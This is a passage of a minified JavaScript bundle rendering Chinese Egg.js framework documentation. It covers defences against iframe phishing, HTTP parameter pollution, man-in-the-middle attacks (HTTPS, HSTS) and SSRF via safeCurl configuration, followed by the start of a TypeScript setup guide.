/>',lang:"html"}),r.a.createElement("h3",{id:"iframe-\u9493\u9c7c"},r.a.createElement(l["AnchorLink"],{to:"#iframe-\u9493\u9c7c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"iframe \u9493\u9c7c"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/Cross_Frame_Scripting"},"iframe \u9493\u9c7c"),"\uff0c\u901a\u8fc7\u5185\u5d4c iframe \u5230\u88ab\u653b\u51fb\u7684\u7f51\u9875\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5f15\u5bfc\u7528\u6237\u53bb\u70b9\u51fb iframe \u6307\u5411\u7684\u5371\u9669\u7f51\u7ad9\uff0c\u751a\u81f3\u906e\u76d6\uff0c\u5f71\u54cd\u7f51\u7ad9\u7684\u6b63\u5e38\u529f\u80fd\uff0c\u52ab\u6301\u7528\u6237\u7684\u70b9\u51fb\u64cd\u4f5c\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"X-Frame-Options")," \u8fd9\u4e2a\u5b89\u5168\u5934\u6765\u9632\u6b62 iframe \u9493\u9c7c\u3002\u9ed8\u8ba4\u503c\u4e3a SAMEORIGIN\uff0c\u53ea\u5141\u8bb8\u540c\u57df\u628a\u672c\u9875\u9762\u5f53\u4f5c iframe \u5d4c\u5165\u3002"),r.a.createElement("p",null,"\u5f53\u9700\u8981\u5d4c\u5165\u4e00\u4e9b\u53ef\u4fe1\u7684\u7b2c\u4e09\u65b9\u7f51\u9875\u65f6\uff0c\u53ef\u4ee5\u5173\u95ed\u8fd9\u4e2a\u914d\u7f6e\u3002"),r.a.createElement("h2",{id:"\u5b89\u5168\u5a01\u80c1-hpp-\u7684\u9632\u8303"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u5168\u5a01\u80c1-hpp-\u7684\u9632\u8303","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u5168\u5a01\u80c1 HPP \u7684\u9632\u8303"),r.a.createElement("p",null,"Http Parameter Pollution\uff08HPP)\uff0c\u5373 HTTP \u53c2\u6570\u6c61\u67d3\u653b\u51fb\u3002\u5728 HTTP \u534f\u8bae\u4e2d\u662f\u5141\u8bb8\u540c\u6837\u540d\u79f0\u7684\u53c2\u6570\u51fa\u73b0\u591a\u6b21\uff0c\u800c\u7531\u4e8e\u5e94\u7528\u7684\u5b9e\u73b0\u4e0d\u89c4\u8303\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u4f20\u64ad\u53c2\u6570\u7684\u65f6\u5019\u4f20\u8f93 key \u76f8\u540c\u800c value \u4e0d\u540c\u7684\u53c2\u6570\uff0c\u4ece\u800c\u8fbe\u5230\u7ed5\u8fc7\u67d0\u4e9b\u9632\u62a4\u7684\u540e\u679c\u3002"),r.a.createElement("p",null,"HPP \u53ef\u80fd\u5bfc\u81f4\u7684\u5b89\u5168\u5a01\u80c1\u6709\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u7ed5\u8fc7\u9632\u62a4\u548c\u53c2\u6570\u6821\u9a8c\u3002"),r.a.createElement("li",null,"\u4ea7\u751f\u903b\u8f91\u6f0f\u6d1e\u548c\u62a5\u9519\uff0c\u5f71\u54cd\u5e94\u7528\u4ee3\u7801\u6267\u884c\u3002")),r.a.createElement("h3",{id:"\u62d3\u5c55\u9605\u8bfb-1"},r.a.createElement(l["AnchorLink"],{to:"#\u62d3\u5c55\u9605\u8bfb-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u62d3\u5c55\u9605\u8bfb"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)"},"https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"http://blog.csdn.net/eatmilkboy/article/details/6761407"},"http://blog.csdn.net/eatmilkboy/article/details/6761407")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf"},"https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf")),r.a.createElement("li",null,"ebay \u56e0\u53c2\u6570\u6c61\u67d3\u5b58\u5728 RCE\uff08\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff09\u6f0f\u6d1e\uff1a",r.a.createElement(l["Link"],{to:"http://secalert.net/2013/12/13/ebay-remote-code-execution/"},"http://secalert.net/2013/12/13/ebay-remote-code-execution/"))),r.a.createElement("h3",{id:"\u5982\u4f55\u9632\u8303"},r.a.createElement(l["AnchorLink"],{to:"#\u5982\u4f55\u9632\u8303","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5982\u4f55\u9632\u8303"),r.a.createElement("p",null,"\u6846\u67b6\u672c\u8eab\u4f1a\u5728\u5ba2\u6237\u7aef\u4f20\u8f93 key \u76f8\u540c\u800c value \u4e0d\u540c\u7684\u53c2\u6570\u65f6\uff0c\u5f3a\u5236\u4f7f\u7528\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u56e0\u6b64\u4e0d\u4f1a\u5bfc\u81f4 hpp \u653b\u51fb\u3002"),r.a.createElement("h2",{id:"\u4e2d\u95f4\u4eba\u653b\u51fb\u4e0e-http--https"},r.a.createElement(l["AnchorLink"],{to:"#\u4e2d\u95f4\u4eba\u653b\u51fb\u4e0e-http--https","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/Man-in-the-middle_attack"},"\u4e2d\u95f4\u4eba\u653b\u51fb"),"\u4e0e HTTP / HTTPS"),r.a.createElement("p",null,"HTTP \u662f\u7f51\u7edc\u5e94\u7528\u5e7f\u6cdb\u4f7f\u7528\u7684\u534f\u8bae\uff0c\u8d1f\u8d23 Web \u5185\u5bb9\u7684\u8bf7\u6c42\u548c\u83b7\u53d6\u3002\u7136\u800c\uff0c\u5185\u5bb9\u8bf7\u6c42\u548c\u83b7\u53d6\u65f6\u4f1a\u7ecf\u8fc7\u8bb8\u591a\u4e2d\u95f4\u4eba\uff0c\u4e3b\u8981\u662f\u7f51\u7edc\u73af\u8282\uff0c\u5145\u5f53\u5185\u5bb9\u5165\u53e3\u7684\u6d4f\u89c8\u5668\u3001\u8def\u7531\u5668\u5382\u5546\u3001WIFI \u63d0\u4f9b\u5546\u3001\u901a\u4fe1\u8fd0\u8425\u5546\uff0c\u5982\u679c\u4f7f\u7528\u4e86\u4ee3\u7406\u3001\u7ffb\u5899\u8f6f\u4ef6\u5219\u4f1a\u5f15\u5165\u66f4\u591a\u4e2d\u95f4\u4eba\u3002\u7531\u4e8e HTTP \u8bf7\u6c42\u7684\u8def\u5f84\u3001\u53c2\u6570\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5747\u662f\u660e\u6587\u7684\uff0c\u56e0\u6b64\u8fd9\u4e9b\u4e2d\u95f4\u4eba\u53ef\u4ee5\u5bf9 HTTP \u8bf7\u6c42\u8fdb\u884c\u76d1\u63a7\u3001\u52ab\u6301\u3001\u963b\u6321\u3002"),r.a.createElement("p",null,"\u5728\u6ca1\u6709 HTTPS \u65f6\uff0c\u8fd0\u8425\u5546\u53ef\u5728\u7528\u6237\u53d1\u8d77\u8bf7\u6c42\u65f6\u76f4\u63a5\u8df3\u8f6c\u5230\u67d0\u4e2a\u5e7f\u544a\uff0c\u6216\u8005\u76f4\u63a5\u6539\u53d8\u641c\u7d22\u7ed3\u679c\u63d2\u5165\u81ea\u5bb6\u7684\u5e7f\u544a\u3002\u5982\u679c\u52ab\u6301\u4ee3\u7801\u51fa\u73b0\u4e86 BUG \uff0c\u5219\u76f4\u63a5\u8ba9\u7528\u6237\u65e0\u6cd5\u4f7f\u7528\uff0c\u51fa\u73b0\u767d\u5c4f\u3002"),r.a.createElement("p",null,"\u6570\u636e\u6cc4\u9732\u3001\u8bf7\u6c42\u52ab\u6301\u3001\u5185\u5bb9\u7be1\u6539\u7b49\u7b49\u95ee\u9898\uff0c\u6838\u5fc3\u539f\u56e0\u5c31\u5728\u4e8e HTTP \u662f\u5168\u88f8\u5f0f\u7684\u660e\u6587\u8bf7\u6c42\uff0c\u57df\u540d\u3001\u8def\u5f84\u548c\u53c2\u6570\u90fd\u88ab\u4e2d\u95f4\u4eba\u4eec\u770b\u5f97\u4e00\u6e05\u4e8c\u695a\u3002HTTPS \u505a\u7684\u5c31\u662f\u7ed9\u8bf7\u6c42\u52a0\u5bc6\uff0c\u8ba9\u5176\u5bf9\u7528\u6237\u66f4\u52a0\u5b89\u5168\u3002\u5bf9\u4e8e\u81ea\u8eab\u800c\u8a00\u9664\u4e86\u4fdd\u969c\u7528\u6237\u5229\u76ca\u5916\uff0c\u8fd8\u53ef\u907f\u514d\u672c\u5c5e\u4e8e\u81ea\u5df1\u7684\u6d41\u91cf\u88ab\u631f\u6301\uff0c\u4ee5\u4fdd\u62a4\u81ea\u8eab\u5229\u76ca\u3002"),r.a.createElement("p",null,"\u5c3d\u7ba1 HTTPS \u5e76\u975e\u7edd\u5bf9\u5b89\u5168\uff0c\u638c\u63e1\u6839\u8bc1\u4e66\u7684\u673a\u6784\u3001\u638c\u63e1\u52a0\u5bc6\u7b97\u6cd5\u7684\u7ec4\u7ec7\u540c\u6837\u53ef\u4ee5\u8fdb\u884c\u4e2d\u95f4\u4eba\u5f62\u5f0f\u7684\u653b\u51fb\u3002\u4e0d\u8fc7 HTTPS \u662f\u73b0\u884c\u67b6\u6784\u4e0b\u6700\u5b89\u5168\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u5e76\u4e14\u5b83\u5927\u5e45\u589e\u52a0\u4e86\u4e2d\u95f4\u4eba\u653b\u51fb\u7684\u6210\u672c\u3002"),r.a.createElement("p",null,"\u56e0\u6b64\uff0c\u8bf7\u5404\u4f4d\u4f7f\u7528 Egg \u6846\u67b6\u5f00\u53d1\u7f51\u7ad9\u7684\u5f00\u53d1\u8005\uff0c\u52a1\u5fc5\u63a8\u52a8\u81ea\u5df1\u7684\u7f51\u7ad9\u5347\u7ea7\u5230 HTTPS\u3002"),r.a.createElement("p",null,"\u5bf9\u4e8e HTTPS \u6765\u8bb2\uff0c\u8fd8\u6709\u4e00\u70b9\u8981\u6ce8\u610f\u7684\u662f HTTP \u4e25\u683c\u4f20\u8f93\u5b89\u5168\uff08HSTS\uff09\uff0c\u5982\u679c\u4e0d\u4f7f\u7528 HSTS\uff0c\u5f53\u7528\u6237\u5728\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165\u7f51\u5740\u65f6\u6ca1\u6709\u52a0 HTTPS\uff0c\u6d4f\u89c8\u5668\u4f1a\u9ed8\u8ba4\u4f7f\u7528 HTTP \u8bbf\u95ee"),r.a.createElement("p",null,"\u6846\u67b6\u9ed8\u8ba4\u5173\u95ed\u4e86 ",r.a.createElement("code",null,"hsts Strict-Transport-Security"),"\u3002\u4f7f\u5f97 HTTPS \u7ad9\u70b9\u4e0d\u8df3\u8f6c\u5230 HTTP\uff0c\u5982\u679c\u7ad9\u70b9\u652f\u6301 HTTPS\uff0c\u8bf7\u4e00\u5b9a\u8981\u5f00\u542f\u3002"),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u7684 Web \u7ad9\u70b9\u662f http \u7ad9\u70b9\uff0c\u9700\u8981\u5173\u95ed\u8fd9\u4e2a\u5934\u3002\u914d\u7f6e\u5982\u4e0b\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"maxAge \u9ed8\u8ba4\u4e00\u5e74 ",r.a.createElement("code",null,"365 * 24 * 3600"),"\u3002"),r.a.createElement("li",null,"includeSubdomains \u9ed8\u8ba4 false, \u53ef\u4ee5\u6dfb\u52a0\u5b50\u57df\u540d\uff0c\u4fdd\u8bc1\u6240\u6709\u5b50\u57df\u540d\u90fd\u4f7f\u7528 HTTPS \u8bbf\u95ee\u3002")),r.a.createElement("h2",{id:"\u5b89\u5168\u5a01\u80c1-ssrf-\u7684\u9632\u8303"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u5168\u5a01\u80c1-ssrf-\u7684\u9632\u8303","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u5168\u5a01\u80c1 SSRF \u7684\u9632\u8303"),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/Server_Side_Request_Forgery"},"Server-Side Request Forgery(SSRF)")," \u653b\u51fb\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\u8bbf\u95ee\u6216\u8005\u64cd\u4f5c\u5185\u90e8\u7f51\u7edc\u7684\u8d44\u6e90\u3002"),r.a.createElement("p",null,"\u4e00\u822c\u6765\u8bf4\uff0cSSRF \u5b89\u5168\u6f0f\u6d1e\u5e38\u89c1\u4e8e\u5f00\u53d1\u8005\u5728\u670d\u52a1\u7aef\u76f4\u63a5\u8bf7\u6c42\u5ba2\u6237\u7aef\u4f20\u9012\u8fdb\u6765\u7684 URL \u8d44\u6e90\uff0c\u4e00\u65e6\u653b\u51fb\u8005\u4f20\u5165\u4e00\u4e9b\u5185\u90e8\u7684 URL \u5373\u53ef\u53d1\u8d77 SSRF \u653b\u51fb\u3002"),r.a.createElement("h3",{id:"\u5982\u4f55\u9632\u8303-1"},r.a.createElement(l["AnchorLink"],{to:"#\u5982\u4f55\u9632\u8303-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5982\u4f55\u9632\u8303"),r.a.createElement("p",null,"\u901a\u5e38\u6211\u4eec\u4f1a\u57fa\u4e8e\u5185\u7f51 IP \u9ed1\u540d\u5355\u7684\u5f62\u5f0f\u6765\u9632\u8303 SSRF \u653b\u51fb\uff0c\u901a\u8fc7\u5bf9\u89e3\u6790\u57df\u540d\u540e\u5f97\u5230\u7684 IP \u505a\u8fc7\u6ee4\uff0c\u7981\u6b62\u8bbf\u95ee\u5185\u90e8 IP \u5730\u5740\u6765\u8fbe\u5230\u9632\u8303 SSRF \u653b\u51fb\u7684\u76ee\u7684\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u5728 ",r.a.createElement("code",null,"ctx"),", ",r.a.createElement("code",null,"app")," \u548c ",r.a.createElement("code",null,"agent")," \u4e0a\u90fd\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"safeCurl")," \u65b9\u6cd5\uff0c\u5728\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\u7684\u540c\u65f6\u4f1a\u5bf9\u6307\u5b9a\u7684\u5185\u7f51 IP \u5730\u5740\u8fc7\u6ee4\uff0c\u9664\u6b64\u4e4b\u5916\uff0c\u8be5\u65b9\u6cd5\u548c\u6846\u67b6\u63d0\u4f9b\u7684 ",r.a.createElement("code",null,"curl")," \u65b9\u6cd5\u4e00\u81f4\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx.safeCurl(url, options)")),r.a.createElement("li",null,r.a.createElement("code",null,"app.safeCurl(url, options)")),r.a.createElement("li",null,r.a.createElement("code",null,"agent.safeCurl(url, options)"))),r.a.createElement("h4",{id:"\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u914d\u7f6e"),r.a.createElement("p",null,"\u76f4\u63a5\u8c03\u7528 ",r.a.createElement("code",null,"safeCurl")," \u65b9\u6cd5\u5176\u5b9e\u5e76\u6ca1\u6709\u4efb\u4f55\u4f5c\u7528\uff0c\u8fd8\u9700\u8981\u914d\u5408\u5b89\u5168\u914d\u7f6e\u9879\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ipBlackList"),"(Array) - \b \u914d\u7f6e\u5185\u7f51 IP \u540d\u5355\uff0c\u5728\u8fd9\u4e9b\u7f51\u6bb5\u5185\u7684 IP \u5730\u5740\u65e0\u6cd5\u88ab\u8bbf\u95ee\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"checkAddress"),"(Function) - \u76f4\u63a5\u914d\u7f6e\u4e00\u4e2a\u68c0\u67e5 IP \u5730\u5740\u7684\u51fd\u6570\uff0c\u6839\u636e\u51fd\u6570\u7684\u8fd4\u56de\u503c\u6765\u5224\u65ad\u662f\u5426\u5141\u8bb8\u5728 ",r.a.createElement("code",null,"safeCurl")," \u4e2d\u88ab\u8bbf\u95ee\uff0c\u5f53\u8fd4\u56de\u975e ",r.a.createElement("code",null,"true")," \u65f6\uff0c\u8be5 IP \u65e0\u6cd5\u88ab\u8bbf\u95ee\u3002",r.a.createElement("code",null,"checkAddress")," \u4f18\u5148\u7ea7\u9ad8\u4e8e ",r.a.createElement("code",null,"ipBlackList"),"\u3002")),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.security = {\n  ssrf: {\n    ipBlackList: [\n      '10.0.0.0/8', // \u652f\u6301 IP \u7f51\u6bb5\n      '0.0.0.0/32',\n      '127.0.0.1', // \u652f\u6301\u6307\u5b9a IP \u5730\u5740\n    ],\n    // \u914d\u7f6e\u4e86 checkAddress \u65f6\uff0cipBlackList \u4e0d\u4f1a\u751f\u6548\n    checkAddress(ip) {\n      return ip !== '127.0.0.1';\n    },\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"\u5176\u4ed6\u5b89\u5168\u5de5\u5177"},r.a.createElement(l["AnchorLink"],{to:"#\u5176\u4ed6\u5b89\u5168\u5de5\u5177","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5176\u4ed6\u5b89\u5168\u5de5\u5177"),r.a.createElement("h3",{id:"ctxissafedomaindomain"},r.a.createElement(l["AnchorLink"],{to:"#ctxissafedomaindomain","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"ctx.isSafeDomain(domain)"),r.a.createElement("p",null,"\u662f\u5426\u4e3a\u5b89\u5168\u57df\u540d\u3002\u5b89\u5168\u57df\u540d\u5728\u914d\u7f6e\u4e2d\u914d\u7f6e\uff0c\u89c1 ",r.a.createElement("code",null,"ctx.redirect")," \u90e8\u5206\u3002"),r.a.createElement("h3",{id:"appinjectcsrfstr"},r.a.createElement(l["AnchorLink"],{to:"#appinjectcsrfstr","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"app.injectCsrf(str)"),r.a.createElement("p",null,"\u8fd9\u4e2a\u51fd\u6570\u63d0\u4f9b\u4e86\u6a21\u677f\u9884\u5904\u7406\uff0d\u81ea\u52a8\u63d2\u5165 CSRF key \u7684\u80fd\u529b\uff0c\u53ef\u4ee5\u81ea\u52a8\u5728\u6240\u6709\u7684 form \u6807\u7b7e\u4e2d\u63d2\u5165 CSRF \u9690\u85cf\u57df\uff0c\u7528\u6237\u5c31\u4e0d\u9700\u8981\u624b\u52a8\u5199\u4e86\u3002"),r.a.createElement("h3",{id:"appinjectnoncestr"},r.a.createElement(l["AnchorLink"],{to:"#appinjectnoncestr","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"app.injectNonce(str)"),r.a.createElement("p",null,"\u8fd9\u4e2a\u51fd\u6570\u63d0\u4f9b\u4e86\u6a21\u677f\u9884\u5904\u7406\uff0d\u81ea\u52a8\u63d2\u5165 nonce \u7684\u80fd\u529b\uff0c\u5982\u679c\u7f51\u7ad9\u5f00\u542f\u4e86 CSP \u5b89\u5168\u5934\uff0c\u5e76\u4e14\u60f3\u4f7f\u7528 ",r.a.createElement("code",null," CSP 2.0 nonce")," \u7279\u6027\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u3002\u53c2\u8003 ",r.a.createElement(l["Link"],{to:"https://www.zhihu.com/question/21979782"},"CSP \u662f\u4ec0\u4e48"),"\u3002"),r.a.createElement("p",null,"\u8fd9\u4e2a\u51fd\u6570\u4f1a\u626b\u63cf\u6a21\u677f\u4e2d\u7684 script \u6807\u7b7e\uff0c\u5e76\u81ea\u52a8\u52a0\u4e0a nonce \u5934\u3002"),r.a.createElement("h3",{id:"appinjecthijackingdefensestr"},r.a.createElement(l["AnchorLink"],{to:"#appinjecthijackingdefensestr","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"app.injectHijackingDefense(str)"),r.a.createElement("p",null,"\u5bf9\u4e8e\u6ca1\u6709\u5f00\u542f HTTPS \u7684\u7f51\u7ad9\uff0c\u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u6709\u6548\u7684\u9632\u6b62\u8fd0\u8425\u5546\u52ab\u6301\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},nVgL:function(e,t,n){var a=n("0mt+"),r=n("0RY8");a({global:!0,forced:parseInt!=r},{parseInt:r})},nkJX:function(e,t){e.exports=Math.sign||function(e){return 0==(e=+e)||e!=e?e:e<0?-1:1}},"nkd+":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("blockquote",null,r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.typescriptlang.org/"},"TypeScript")," \u662f JavaScript \u7c7b\u578b\u7684\u8d85\u96c6\uff0c\u5b83\u53ef\u4ee5\u7f16\u8bd1\u6210\u7eaf JavaScript\u3002")),r.a.createElement("p",null,"TypeScript \u7684\u9759\u6001\u7c7b\u578b\u68c0\u67e5\uff0c\u667a\u80fd\u63d0\u793a\uff0cIDE \u53cb\u597d\u6027\u7b49\u7279\u6027\uff0c\u5bf9\u4e8e\u5927\u89c4\u6a21\u4f01\u4e1a\u7ea7\u5e94\u7528\uff0c\u662f\u975e\u5e38\u7684\u6709\u4ef7\u503c\u7684\u3002\u8be6\u89c1\uff1a",r.a.createElement(l["Link"],{to:"https://juejin.im/post/59c46bc86fb9a00a4636f939"},"TypeScript \u4f53\u7cfb\u8c03\u7814\u62a5\u544a")," \u3002"),r.a.createElement("p",null,"\u7136\u800c\uff0c\u6b64\u524d\u4f7f\u7528 TypeScript \u5f00\u53d1 Egg \uff0c\u4f1a\u9047\u5230\u4e00\u4e9b\u5f71\u54cd ",r.a.createElement("strong",null,"\u5f00\u53d1\u8005\u4f53\u9a8c")," \u95ee\u9898\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"Egg \u6700\u7cbe\u9ad3\u7684 Loader \u81ea\u52a8\u52a0\u8f7d\u673a\u5236\uff0c\u5bfc\u81f4 TS \u65e0\u6cd5\u9759\u6001\u5206\u6790\u51fa\u90e8\u5206\u4f9d\u8d56\u3002"),r.a.createElement("li",null,"Config \u81ea\u52a8\u5408\u5e76\u673a\u5236\u4e0b\uff0c\u5982\u4f55\u5728 ",r.a.createElement("code",null,"config.","{","env","}",".js")," \u91cc\u9762\u4fee\u6539\u63d2\u4ef6\u63d0\u4f9b\u7684\u914d\u7f6e\u65f6\uff0c\u80fd\u6821\u9a8c\u5e76\u667a\u80fd\u63d0\u793a\uff1f"),r.a.createElement("li",null,"\u5f00\u53d1\u671f\u9700\u8981\u72ec\u7acb\u5f00\u4e00\u4e2a ",r.a.createElement("code",null,"tsc -w")," \u72ec\u7acb\u8fdb\u7a0b\u6765\u6784\u5efa\u4ee3\u7801\uff0c\u5e26\u6765\u4e34\u65f6\u6587\u4ef6\u4f4d\u7f6e\u7ea0\u7ed3\u4ee5\u53ca ",r.a.createElement("code",null,"npm scripts")," \u590d\u6742\u5316\u3002"),r.a.createElement("li",null,"\u5355\u5143\u6d4b\u8bd5\uff0c\u8986\u76d6\u7387\u6d4b\u8bd5\uff0c\u7ebf\u4e0a\u9519\u8bef\u5806\u6808\u5982\u4f55\u6307\u5411 TS \u6e90\u6587\u4ef6\uff0c\u800c\u4e0d\u662f\u7f16\u8bd1\u540e\u7684 js \u6587\u4ef6\u3002")),r.a.createElement("p",null,"\u672c\u6587\u4e3b\u8981\u9610\u8ff0\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("strong",null,"\u5e94\u7528\u5c42 TS \u5f00\u53d1\u89c4\u8303")),r.a.createElement("li",null,r.a.createElement("strong",null,"\u6211\u4eec\u5728\u5de5\u5177\u94fe\u65b9\u9762\u7684\u652f\u6301\uff0c\u662f\u5982\u4f55\u6765\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\uff0c\u8ba9\u5f00\u53d1\u8005\u51e0\u4e4e\u65e0\u611f\u77e5\u5e76\u4fdd\u6301\u4e00\u81f4\u6027\u3002"))),r.a.createElement("p",null,"\u5177\u4f53\u7684\u6298\u817e\u8fc7\u7a0b\u53c2\u89c1\uff1a",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/issues/2272"},"[RFC] TypeScript tool support")),r.a.createElement("hr",null),r.a.createElement("h2",{id:"\u5feb\u901f\u5165\u95e8"},r.a.createElement(l["AnchorLink"],{to:"#\u5feb\u901f\u5165\u95e8","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5feb\u901f\u5165\u95e8"),r.a.createElement("p",null,"\u901a\u8fc7\u9aa8\u67b6\u5feb\u901f\u521d\u59cb\u5316\uff1a"),r.a.createElement(o["a"],{code:"$ mkdir showcase && cd showcase\n$ npm init egg --type=ts\n$ npm i\n$ npm run dev",lang:"bash"}),r.a.createElement("p",null,"\u4e0a\u8ff0\u9aa8\u67b6\u4f1a\u751f\u6210\u4e00\u4e2a\u6781\u7b80\u7248\u7684\u793a\u4f8b\uff0c\u66f4\u5b8c\u6574\u7684\u793a\u4f8b\u53c2\u89c1\uff1a",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/hackernews-async-ts"},"eggjs/examples/hackernews-async-ts")),r.a.createElement("p",null,r.a.createElement("img",{src:"https://user-images.githubusercontent.com/227713/38358019-bf7890fa-38f6-11e8-8955-ea072ac6dc8c.gif",alt:"tegg.gif"})),r.a.createElement("hr",null),r.a.createElement("h2",{id:"\u76ee\u5f55\u89c4\u8303"},r.a.createElement(l["AnchorLink"],{to:"#\u76ee\u5f55\u89c4\u8303","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u76ee\u5f55\u89c4\u8303"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u4e00\u4e9b\u7ea6\u675f\uff1a")),r.a.createElement("ul",null,r.a.createElement("li",null,"Egg \u76ee\u524d\u6ca1\u6709\u8ba1\u5212\u4f7f\u7528 TS \u91cd\u5199\u3002"),r.a.createElement("li",null,"Egg \u4ee5\u53ca\u5b83\u5bf9\u5e94\u7684\u63d2\u4ef6\uff0c\u4f1a\u63d0\u4f9b\u5bf9\u5e94\u7684 ",r.a.createElement("code",null,"index.d.ts")," \u6587\u4ef6\u65b9\u4fbf\u5f00\u53d1\u8005\u4f7f\u7528\u3002"),r.a.createElement("li",null,"TypeScript \u53ea\u662f\u5176\u4e2d\u4e00\u79cd\u793e\u533a\u5b9e\u8df5\uff0c\u6211\u4eec\u901a\u8fc7\u5de5\u5177\u94fe\u7ed9\u4e88\u4e00\u5b9a\u7a0b\u5ea6\u7684\u652f\u6301\u3002"),r.a.createElement("li",null,"TypeScript \u6700\u4f4e\u8981\u6c42\uff1a\u7248\u672c 2.8\u3002")),r.a.createElement("p",null,"\u6574\u4f53\u76ee\u5f55\u7ed3\u6784\u4e0a\u8ddf Egg \u666e\u901a\u9879\u76ee\u6ca1\u5565\u533a\u522b:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"typescript")," \u4ee3\u7801\u98ce\u683c\uff0c\u540e\u7f00\u540d\u4e3a ",r.a.createElement("code",null,"ts")),r.a.createElement("li",null,r.a.createElement("code",null,"typings")," \u76ee\u5f55\u7528\u4e8e\u653e\u7f6e ",r.a.createElement("code",null,"d.ts")," \u6587\u4ef6\uff08\u5927\u90e8\u5206\u4f1a\u81ea\u52a8\u751f\u6210\uff09")),r.a.createElement(o["a"],{code:"showcase\n\u251c\u2500\u2500 app\n\u2502   \u251c\u2500\u2500 controller\n\u2502   \u2502   \u2514\u2500\u2500 home.ts\n\u2502   \u251c\u2500\u2500 service\n\u2502   \u2502   \u2514\u2500\u2500 news.ts\n\u2502   \u2514\u2500\u2500 router.ts\n\u251c\u2500\u2500 config\n\u2502   \u251c\u2500\u2500 config.default.ts\n\u2502   \u251c\u2500\u2500 config.local.ts\n\u2502   \u251c\u2500\u2500 config.prod.ts\n\u2502   \u2514\u2500\u2500 plugin.ts\n\u251c\u2500\u2500 test\n\u2502   \u2514\u2500\u2500 **/*.test.ts\n\u251c\u2500\u2500 typings\n\u2502   \u2514\u2500\u2500 **/*.d.ts\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 tsconfig.json\n\u2514\u2500\u2500 